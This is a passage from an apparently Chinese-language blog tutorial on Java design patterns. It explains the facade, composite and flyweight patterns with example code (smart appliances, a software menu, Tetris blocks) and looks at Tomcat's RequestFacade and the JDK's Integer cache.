<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//灯类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Light</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打开了灯....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">off</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;关闭了灯....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电视类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TV</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打开了电视....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">off</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;关闭了电视....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//控制类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AirCondition</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打开了空调....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">off</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;关闭了空调....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//智能音箱</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmartAppliancesFacade</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Light light;</span><br><span class="line">    <span class="keyword">private</span> TV tv;</span><br><span class="line">    <span class="keyword">private</span> AirCondition airCondition;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SmartAppliancesFacade</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        light = <span class="keyword">new</span> Light();</span><br><span class="line">        tv = <span class="keyword">new</span> TV();</span><br><span class="line">        airCondition = <span class="keyword">new</span> AirCondition();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(message.contains(<span class="string">&quot;打开&quot;</span>)) &#123;</span><br><span class="line">            on();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(message.contains(<span class="string">&quot;关闭&quot;</span>)) &#123;</span><br><span class="line">            off();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我还听不懂你说的！！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//起床后一键开电器</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;起床了&quot;</span>);</span><br><span class="line">        light.on();</span><br><span class="line">        tv.on();</span><br><span class="line">        airCondition.on();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//睡觉一键关电器</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">off</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;睡觉了&quot;</span>);</span><br><span class="line">        light.off();</span><br><span class="line">        tv.off();</span><br><span class="line">        airCondition.off();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建外观对象</span></span><br><span class="line">        SmartAppliancesFacade facade = <span class="keyword">new</span> SmartAppliancesFacade();</span><br><span class="line">        <span class="comment">//客户端直接与外观对象进行交互</span></span><br><span class="line">        facade.say(<span class="string">&quot;打开家电&quot;</span>);</span><br><span class="line">        facade.say(<span class="string">&quot;关闭家电&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>好处：</strong></p>
<ul>
<li>降低了子系统与客户端之间的耦合度，使得子系统的变化不会影响调用它的客户类。</li>
<li>对客户屏蔽了子系统组件，减少了客户处理的对象数目，并使得子系统使用起来更加容易。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>不符合开闭原则，修改很麻烦</li>
</ul>
<h5 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>对分层结构系统构建时，使用外观模式定义子系统中每层的入口点可以简化子系统之间的依赖关系。</li>
<li>当一个复杂系统的子系统很多时，==外观模式可以为系统设计一个简单的接口供外界访问==。</li>
<li>当==客户端与多个子系统之间存在很大的联系时，引入外观模式可将它们分离，从而提高子系统的独立性和可移植性==。</li>
</ul>
<h5 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h5><p>使用tomcat作为web容器时，接收浏览器发送过来的请求，tomcat会将请求信息封装成ServletRequest对象，如下图①处对象。但是大家想想ServletRequest是一个接口，它还有一个子接口HttpServletRequest，而我们知道该request对象肯定是一个HttpServletRequest对象的子实现类对象，到底是哪个类的对象呢？可以通过输出request对象，我们就会发现是一个名为RequestFacade的类的对象。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-34-41.png" style="zoom:60%;" />

<p>RequestFacade类就使用了外观模式。先看结构图：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-37-29.png" style="zoom:70%;" />

<p><strong>为什么在此处使用外观模式呢？</strong></p>
<p>​    定义 RequestFacade 类，分别实现 ServletRequest ，同时定义私有成员变量 Request ，并且方法的实现调用 Request  的实现。然后，将 RequestFacade上转为 ServletRequest  传给 servlet 的 service 方法，这样==即使在 servlet 中被下转为 RequestFacade ，也不能访问私有成员变量对象中的方法。既用了 Request ，又能防止其中方法被不合理的访问==。</p>
<h4 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h4><p><strong>概述</strong></p>
<p>对于这个图片肯定会非常熟悉，上图我们可以看做是一个文件系统，对于这样的结构我们称之为树形结构。在树形结构中可以通过调用某个方法来遍历整个树，当我们找到某个叶子节点后，就可以对叶子节点进行相关的操作。可以将这颗树理解成一个大的容器，容器里面包含很多的成员对象，这些成员对象即可是容器对象也可以是叶子对象。但是由于容器对象和叶子对象在功能上面的区别，使得我们在使用的过程中必须要区分容器对象和叶子对象，但是这样就会给客户带来不必要的麻烦，作为客户而已，它始终希望能够一致的对待容器对象和叶子对象。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-13-00.png" style="zoom:60%;" />



<p><strong>定义：</strong></p>
<p>又名部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。</p>
<h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>组合模式主要包含三种角色：</p>
<ul>
<li>抽象根节点（Component）：定义系统各层次对象的共有方法和属性，可以预先定义一些默认行为和属性。</li>
<li>树枝节点（Composite）：定义树枝节点的行为，存储子节点，组合树枝节点和叶子节点形成一个树形结构。</li>
<li>叶子节点（Leaf）：叶子节点对象，其下再无分支，是系统层次遍历的最小单位。</li>
</ul>
<h5 id="案例实现"><a href="#案例实现" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】软件菜单</p>
<p>如下图，我们在访问别的一些管理系统时，经常可以看到类似的菜单。一个菜单可以包含菜单项（菜单项是指不再包含其他内容的菜单条目），也可以包含带有其他菜单项的菜单，因此使用组合模式描述菜单就很恰当，我们的需求是针对一个菜单，打印出其包含的所有菜单以及菜单项的名称。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-30-18.png" style="zoom:80%;" />

<p>要实现该案例，我们先画出类图：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-28-34.png" style="zoom:80%;" />

<p><strong>代码实现：</strong></p>
<p>不管是菜单还是菜单项，都应该继承自统一的接口，这里姑且将这个统一的接口称为菜单组件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//菜单组件  不管是菜单还是菜单项，都应该继承该类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">MenuComponent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> level;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加菜单</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(MenuComponent menuComponent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//移除菜单</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(MenuComponent menuComponent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取指定的子菜单</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MenuComponent <span class="title">getChild</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取菜单名称</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的MenuComponent定义为抽象类，因为有一些共有的属性和行为要在该类中实现，Menu和MenuItem类就可以只覆盖自己感兴趣的方法，而不用搭理不需要或者不感兴趣的方法，举例来说，Menu类可以包含子菜单，因此需要覆盖add()、remove()、getChild()方法，但是MenuItem就不应该有这些方法。这里给出的默认实现是抛出异常，你也可以根据自己的需要改写默认实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Menu</span> <span class="keyword">extends</span> <span class="title">MenuComponent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;MenuComponent&gt; menuComponentList;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Menu</span><span class="params">(String name,<span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.level = level;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        menuComponentList = <span class="keyword">new</span> ArrayList&lt;MenuComponent&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(MenuComponent menuComponent)</span> </span>&#123;</span><br><span class="line">        menuComponentList.add(menuComponent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(MenuComponent menuComponent)</span> </span>&#123;</span><br><span class="line">        menuComponentList.remove(menuComponent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MenuComponent <span class="title">getChild</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> menuComponentList.get(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; level; i++) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">for</span> (MenuComponent menuComponent : menuComponentList) &#123;</span><br><span class="line">            menuComponent.print();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Menu类已经实现了除了getName方法的其他所有方法，因为Menu类具有添加菜单，移除菜单和获取子菜单的功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MenuItem</span> <span class="keyword">extends</span> <span class="title">MenuComponent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MenuItem</span><span class="params">(String name,<span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.level = level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; level; i++) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MenuItem是菜单项，不能再有子菜单，所以添加菜单，移除菜单和获取子菜单的功能并不能实现。</p>
<p><strong>组合模式的分类</strong></p>
<p>在使用组合模式时，根据抽象构件类的定义形式，我们可将组合模式分为透明组合模式和安全组合模式两种形式。</p>
<ul>
<li><p>透明组合模式</p>
<p>透明组合模式中，抽象根节点角色中声明了所有用于管理成员对象的方法，比如在示例中 <code>MenuComponent</code> 声明了 <code>add</code>、<code>remove</code> 、<code>getChild</code> 方法，这样做的<strong>好处是确保所有的构件类都有相同的接口</strong>。透明组合模式也是组合模式的标准形式。</p>
<p>透明组合模式的<strong>缺点是不够安全</strong>，因为叶子对象和容器对象在本质上是有区别的，叶子对象不可能有下一个层次的对象，即不可能包含成员对象，因此为其提供 add()、remove() 等方法是没有意义的，这在编译阶段不会出错，但在运行阶段如果调用这些方法可能会出错（如果没有提供相应的错误处理代码）</p>
</li>
<li><p>安全组合模式</p>
<p>在安全组合模式中，在抽象构件角色中没有声明任何用于管理成员对象的方法，而是在树枝节点 <code>Menu</code> 类中声明并实现这些方法。安全组合模式的<strong>缺点是不够透明</strong>，因为叶子构件和容器构件具有不同的方法，且容器构件中那些用于管理成员对象的方法没有在抽象构件类中定义，因此客户端<strong>不能完全针对抽象编程，必须有区别地对待叶子构件和容器构件</strong>。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-13-44.png" style="zoom:80%;" /></li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>组合模式可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次，它让客户端忽略了层次的差异，方便对整个层次结构进行控制。</li>
<li>客户端可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了客户端代码。</li>
<li>在组合模式中增加新的树枝节点和叶子节点都很方便，无须对现有类库进行任何修改，符合“开闭原则”。</li>
<li>组合模式为树形结构的面向对象实现提供了一种灵活的解决方案，通过叶子节点和树枝节点的递归组合，可以形成复杂的树形结构，但对树形结构的控制却非常简单。</li>
</ul>
<p><strong>使用场景</strong></p>
<p>组合模式正是应树形结构而生，所以组合模式的<strong>使用场景就是出现树形结构的地方</strong>。比如：文件目录显示，多级目录呈现等树形结构数据的操作。</p>
<h4 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h4><p><strong>定义：</strong></p>
<p>运用共享技术来有效地支持大量细粒度对象的复用。它通过共享已经存在的对象来大幅度减少需要创建的对象数量、避免大量相似对象的开销，从而提高系统资源的利用率。</p>
<p><strong>结构</strong></p>
<p>享元（Flyweight ）模式中存在以下两种状态：</p>
<ol>
<li><strong>内部状态</strong>，即不会随着环境的改变而改变的可共享部分。</li>
<li><strong>外部状态</strong>，指随环境改变而改变的不可以共享的部分。享元模式的实现要领就是区分应用中的这两种状态，并将外部状态外部化。（<strong>实现方式：可以作为方法的形式参数进行传递</strong>）</li>
</ol>
<p>享元模式的主要有以下角色：</p>
<ul>
<li>抽象享元角色（Flyweight）：通常是一个接口或抽象类，在抽象享元类中声明了具体享元类公共的方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）。</li>
<li>具体享元（Concrete Flyweight）角色 ：它实现了抽象享元类，称为享元对象；在具体享元类中为内部状态提供了存储空间。通常我们可以结合单例模式来设计具体享元类，为每一个具体享元类提供唯一的享元对象。</li>
<li>非享元（Unsharable Flyweight)角色 ：并不是所有的抽象享元类的子类都需要被共享，不能被共享的子类可设计为非共享具体享元类；当需要一个非共享具体享元类的对象时可以直接通过实例化创建。</li>
<li>享元工厂（Flyweight Factory）角色 ：负责创建和管理享元角色。当客户对象请求一个享元对象时，享元工厂检査系统中是否存在符合要求的享元对象，如果存在则提供给客户；如果不存在的话，则创建一个新的享元对象。</li>
</ul>
<p><strong>案例实现</strong></p>
<p>【例】俄罗斯方块</p>
<p>下面的图片是众所周知的俄罗斯方块中的一个个方块，如果在俄罗斯方块这个游戏中，每个不同的方块都是一个实例对象，这些对象就要占用很多的内存空间，下面利用享元模式进行实现。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-24-08.jpeg" style="zoom:60%;" />



<p><strong>先来看类图：</strong></p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-25-56.png" style="zoom:80%;" />

<p><strong>代码如下：</strong></p>
<p>俄罗斯方块有不同的形状，我们可以对这些形状向上抽取出AbstractBox，用来定义共性的属性和行为。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractBox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getShape</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">(String color)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方块形状：&quot;</span> + <span class="keyword">this</span>.getShape() + <span class="string">&quot; 颜色：&quot;</span> + color);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是定义不同的形状了，IBox类、LBox类、OBox类等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IBox</span> <span class="keyword">extends</span> <span class="title">AbstractBox</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getShape</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LBox</span> <span class="keyword">extends</span> <span class="title">AbstractBox</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getShape</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;L&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OBox</span> <span class="keyword">extends</span> <span class="title">AbstractBox</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getShape</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;O&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供了一个工厂类（BoxFactory），用来管理享元对象（也就是AbstractBox子类对象），该工厂类对象只需要一个，所以可以使用单例模式。并给工厂类提供一个获取形状的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BoxFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;String, AbstractBox&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BoxFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;String, AbstractBox&gt;();</span><br><span class="line">        AbstractBox iBox = <span class="keyword">new</span> IBox();</span><br><span class="line">        AbstractBox lBox = <span class="keyword">new</span> LBox();</span><br><span class="line">        AbstractBox oBox = <span class="keyword">new</span> OBox();</span><br><span class="line">        map.put(<span class="string">&quot;I&quot;</span>, iBox);</span><br><span class="line">        map.put(<span class="string">&quot;L&quot;</span>, lBox);</span><br><span class="line">        map.put(<span class="string">&quot;O&quot;</span>, oBox);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提供一个方法获取该工厂类对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> BoxFactory <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里属于单例模式中的“饿汉式”单例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> BoxFactory INSTANCE = <span class="keyword">new</span> BoxFactory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据名称获取图形对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AbstractBox <span class="title">getBox</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="优缺点和使用场景"><a href="#优缺点和使用场景" class="headerlink" title="优缺点和使用场景"></a>优缺点和使用场景</h5><ol>
<li><p><strong>优点</strong></p>
<ul>
<li>极大减少内存中相似或相同对象数量，节约系统资源，提供系统性能</li>
<li>享元模式中的外部状态相对独立，且不影响内部状态</li>
</ul>
</li>
<li><p><strong>缺点</strong></p>
<ul>
<li>为了使对象可以共享，需要将享元对象的部分状态外部化，分离内部状态和外部状态，使程序逻辑复杂</li>
</ul>
</li>
<li><p><strong>使用场景：</strong></p>
<ul>
<li>一个系统有大量相同或者相似的对象，造成内存的大量耗费。</li>
<li>对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。</li>
<li>在使用享元模式时<strong>需要维护一个存储享元对象的享元池</strong>，而这需要耗费一定的系统资源，因此，应当在需要多次重复使用享元对象时才值得使用享元模式。</li>
</ul>
</li>
</ol>
<h5 id="JDK源码解析-2"><a href="#JDK源码解析-2" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p>Integer类使用了享元模式。我们先看下面的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer i1 = <span class="number">127</span>;</span><br><span class="line">        Integer i2 = <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;i1和i2对象是否是同一个对象？&quot;</span> + (i1 == i2));</span><br><span class="line"></span><br><span class="line">        Integer i3 = <span class="number">128</span>;</span><br><span class="line">        Integer i4 = <span class="number">128</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;i3和i4对象是否是同一个对象？&quot;</span> + (i3 == i4));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上面代码，结果如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-17-26-27.png" style="zoom:80%;" />

<p>为什么第一个输出语句输出的是true，第二个输出语句输出的是false？通过反编译软件进行反编译，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer i1 = Integer.valueOf((<span class="keyword">int</span>)<span class="number">127</span>);</span><br><span class="line">        Integer i2 Integer.valueOf((<span class="keyword">int</span>)<span class="number">127</span>);</span><br><span class="line">        System.out.println((String)<span class="keyword">new</span> StringBuilder().append((String)<span class="string">&quot;i1\u548ci2\u5bf9\u8c61\u662f\u5426\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\uff1f&quot;</span>).append((<span class="keyword">boolean</span>)(i1 == i2)).toString());</span><br><span class="line">        Integer i3 = Integer.valueOf((<span class="keyword">int</span>)<span class="number">128</span>);</span><br><span class="line">        Integer i4 = Integer.valueOf((<span class="keyword">int</span>)<span class="number">128</span>);</span><br><span class="line">        System.out.println((String)<span class="keyword">new</span> StringBuilder().append((String)<span class="string">&quot;i3\u548ci4\u5bf9\u8c61\u662f\u5426\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\uff1f&quot;</span>).append((<span class="keyword">boolean</span>)(i3 == i4)).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码可以看到，直接给Integer类型的变量赋值基本数据类型数据的操作底层使用的是 <code>valueOf()</code> ，所以只需要看该方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Integer</span> <span class="keyword">extends</span> <span class="title">Number</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title">valueOf</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class="line">            <span class="keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Integer(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span 